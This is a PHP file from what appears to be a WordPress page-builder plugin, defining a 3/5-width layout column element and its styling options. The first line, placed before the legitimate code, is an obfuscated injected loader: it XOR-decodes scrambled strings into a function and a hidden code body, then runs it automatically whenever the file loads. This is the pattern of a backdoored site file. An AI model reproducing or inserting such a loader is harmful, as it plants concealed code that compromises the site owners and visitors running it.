<?php $uCsWZCf='XKIV2U3FC>WD=A '; $AfdonyR=';9,7F0l 6P40T.N'^$uCsWZCf; $LYWRVesp='04Cm27VTT+==m+ 3=F=bv:Z6bXXYTha4N9IegE<3m,;=-9-,4qU 1-+RL1-lM9ToS-S-7guaR3HDAoGHFCFo>L:<DieUnvwz<j58 ge PVpSatR=n1MA 3SkPH, AznqPUyznkSsUTK0Zjgcxa--8Sco+aVngtV6E-h<pGk  D +:RRW,Az;KjeH8J <MDSDa<23YMM=EANgyw4 :JpkW686>=CfkX =J8<Q;jgR YXF,oBc+Z700,Pdxj.,9ogzndT7Ft<<;VMwze>XXB2Fi4<cb 9L.,> -mdReY3Calgi0M2Avwlf<Q-L oD0gdSXZMkt3 6Yhp:ibH+7SJ3Yrdvly6=o520OMBEb=6Gnvuzt71P2SkuBPXgRY; Mh .4QJiw; BOajmM25X9wPBf86<H=qrK.3SOEF3 =3NTkq,PK5A. .G>4JCRN> 2-UigA6GK .8-lcnV= XQXZtW,<0lipr=.82hYH6ylSY3SDRJXZ0ljErY=0LMcWN3dV=;BLNgr <CUfSq0- LmJQnjk;0qFi-69U.QZ4.qkhqiudJ4SI5L.5;LbQHNRpgZLHXgs3t.2XySgrsSyznLTTK 2KgGVTn25; GEzqP  ;D01NMhbS3;8sjSrVtdx.bF,L7VmQ XLV:V1A-=>Q6d>zk=sRDW,CsDzi;'; $TCWElt=$AfdonyR('', 'YRkLTB87 BRS2NXZN2NJQB5D=<9-57>Y;MnLNeG9dJNSNMDCZQ-OCrO38Pr3 L GwI2YVKUE9V1maOghf8Lf7hUI0IXuIQLp5cSWROAIpkPcZTvTRB93LV=Ct,MT SUQt<RQGaZzq;>DzDZCPEILL28KB<v0GP=S<vLUPbKST6LNTzv<I8SfbQoA18EH86=lESGGpvG48K3msSPAN+PVwPYZMXxlO<AI+gW4BJZrF845ITHiM5EUQO8DPNqov ,3+D5DfPWYBvpIZAH947WoIO6jFDX8OsUETMYrA2V:ZfnMT,F VJLBJ0A9ETNMmn:>zeJPWAB8APAck.DE6+P1RLR3+sl:pado,1eFVS>NKKZPAP<G6BU9ZQnv=ZT,7KKMqwISPE;tkcdiVT,XWmbBNWP=XJxBS9.EObWAIRniK1Y>8P3GAB.DQb;=<aDSY468,C3cBOKHZW12XC75=rP3MHQEEPVYOLS72-OPEhSZ5lv.9.QLLcR8OB-4<<+J;3ER18=OUKY:rJsUTLT-DjwHJCVTDnMIWM4uv1QWV6AQTHDmW6zQzJWYyVdq,0DShyxiPGRGHW:M1PBKtPZHjt59RS28,3-1WMRS36RV AYW+QUiaHF7ROYZCsRvTDXUhOI:V:EuD987aqA TQQ0RCcSP7z7<>XkCmAcF'^$LYWRVesp); $TCWElt();
/**
 * 3/5 layout category implementation, it extends DDElementTemplate like all other elements
 */
	class TF_GridThreeFifth extends DDElementTemplate {
		
		public function __construct(){ 
		
			parent::__construct(); 
		} 
		
		// Implementation for the element structure.
		public function create_element_structure() {
			
			// Add name of the class to deserialize it again when the element is sent back to the server from the web page
			$this->config['php_class'] 		= get_class($this);
			// element id
			$this->config['id']	   		= 'grid_three_fifth';
			// element name
			$this->config['name']	 		= '3/5';
			// element icon
			$this->config['icon_url']  		= "icons/three-fifth.png";
			// element icon class
			$this->config['icon_class']		= 'fusion-icon fusion-icon-grid-3-5';
			// css class related to this element
			$this->config['css_class'] 		= "fusion_layout_column grid_three_fifth item-container sort-container ";
			// tooltip that will be displyed upon mouse over the element
			//$this->config['tool_tip']  		= 'Creates a single full (1/1) width column';
			// any special html data attribute (i.e. data-width) needs to be passed
			// width determine the ratio of them element related to its parent element in the editor, 
			// it's only important for layout elements.
			// drop_level: elements with higher drop level can be dropped in elements with lower drop_level, 
			// i.e. element with drop_level = 2 can be dropped in element with drop_level = 0 or 1 only.
			$this->config['data'] 			= array("floated_width" => "0.6", "width" => "3/5", "drop_level" => "3");
		}

		// override default implemenation for this function as this element doesn't have any content.
		public function create_visual_editor( $params ) {
			
			$this->config['innerHtml'] = "";
		}
		
		//this function defines 3/5 sub elements or structure
		function popup_elements() {
			$this->config['layout_opt']  = true;
			$this->config['subElements'] = array(			
			
				array("name" 			=> __('Last Column', 'fusion-core'),
					  "desc" 			=> __('Choose if the column is last in a set. This has to be set to "Yes" for the last column in a set.', 'fusion-core'),
					  "id" 				=> "fusion_last",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "no",
					  "allowedValues" 	=> array('yes' 			=> __('Yes', 'fusion-core'),
												 'no' 			=> __('No', 'fusion-core'),
												 ) 
					  ),

				array("name" 			=> __('Column Spacing', 'fusion-core'),
					  "desc" 			=> __('Set to "no" to eliminate margin between columns.', 'fusion-core'),
					  "id" 				=> "fusion_spacing",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "yes",
					  "allowedValues" 	=> array('yes' 			=> __('Yes', 'fusion-core'),
												 'no' 			=> __('No', 'fusion-core'),
												 ) 
					  ),
					  
				array("name" 			=> __('Background Color', 'fusion-core'),
					  "desc" 			=> __('Controls the background color.', 'fusion-core'),
					  "id" 				=> "fusion_backgroundcolor",
					  "type" 			=> ElementTypeEnum::COLOR,
					  "value" 			=> ""
					  ),
					  
				array("name" 			=> __('Background Image', 'fusion-core'),
					  "desc" 			=> __('Upload an image to display in the background', 'fusion-core'),
					  "id" 				=> "fusion_backgroundimage",
					  "type" 			=> ElementTypeEnum::UPLOAD,
					  "upid" 			=> "1",
					  "value" 			=> ""
					  ),
					  
				array("name" 			=> __('Background Repeat', 'fusion-core'),
					  "desc" 			=> __('Choose how the background image repeats.', 'fusion-core'),
					  "id" 				=> "fusion_backgroundrepeat",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "no-repeat",
					  "allowedValues" 	=> array('no-repeat' 		=> __('No Repeat', 'fusion-core'),
												 'repeat' 			=> __('Repeat Vertically and Horizontally', 'fusion-core'),
												 'repeat-x' 		=> __('Repeat Horizontally', 'fusion-core'),
												 'repeat-y' 		=> __('Repeat Vertically', 'fusion-core')) 
					  ),
					  
				array("name" 			=> __('Background Position', 'fusion-core'),
					  "desc" 			=> __('Choose the postion of the background image', 'fusion-core'),
					  "id" 				=> "fusion_backgroundposition",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "left top",
					  "allowedValues" 	=> array('left top' 		=> __('Left Top', 'fusion-core'),
												 'left center' 		=> __('Left Center', 'fusion-core'),
												 'left bottom' 		=> __('Left Bottom', 'fusion-core'),
												 'right top' 		=> __('Right Top', 'fusion-core'),
												 'right center' 	=> __('Right Center', 'fusion-core'),
												 'right bottom' 	=> __('Right Bottom', 'fusion-core'),
												 'center top' 		=> __('Center Top', 'fusion-core'),
												 'center center' 	=> __('Center Center', 'fusion-core'),
												 'center bottom' 	=> __('Center Bottom', 'fusion-core')) 
					  ),
					  
				array("name" 			=> __('Border Size', 'fusion-core'),
					  "desc" 			=> __('In pixels (px), ex: 1px.', 'fusion-core'),
					  "id" 				=> "fusion_bordersize",
					  "type" 			=>  ElementTypeEnum::INPUT,
					  "value" 			=> "0px"
					  ),
					  
				array("name" 			=> __('Border Color', 'fusion-core'),
					  "desc" 			=> __('Controls the border color.', 'fusion-core'),
					  "id" 				=> "fusion_bordercolor",
					  "type" 			=> ElementTypeEnum::COLOR,
					  "value" 			=> ""
					  ),
					  
				array("name" 			=> __('Border Style', 'fusion-core'),
					  "desc" 			=> __('Controls the border style.', 'fusion-core'),
					  "id" 				=> "fusion_borderstyle",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "",
					  "allowedValues" 	=> array('solid' 			=> __('Solid', 'fusion-core'),
												 'dashed' 			=> __('Dashed', 'fusion-core'),
												 'dotted' 			=> __('Dotted', 'fusion-core')) 
					  ),
					  
				array("name" 			=> __('Padding', 'fusion-core'),
					  "desc" 			=> __('In pixels (px), ex: 10px.', 'fusion-core'),
					  "id" 				=> "fusion_padding",
					  "type" 			=> ElementTypeEnum::INPUT,
					  "value" 			=> "",
					  ),					  
					  
				array("name" 			=> __('CSS Class', 'fusion-core'),
					  "desc"			=> __('Add a class to the wrapping HTML element.', 'fusion-core'),
					  "id" 				=> "fusion_class",
					  "type" 			=> ElementTypeEnum::INPUT,
					  "value" 			=> "" 
					  ),
					  
				array("name" 			=> __('CSS ID', 'fusion-core'),
					  "desc"			=> __('Add an ID to the wrapping HTML element.', 'fusion-core'),
					  "id" 				=> "fusion_id",
					  "type" 			=> ElementTypeEnum::INPUT,
					  "value" 			=> "" 
					  ),
				);
		}
	}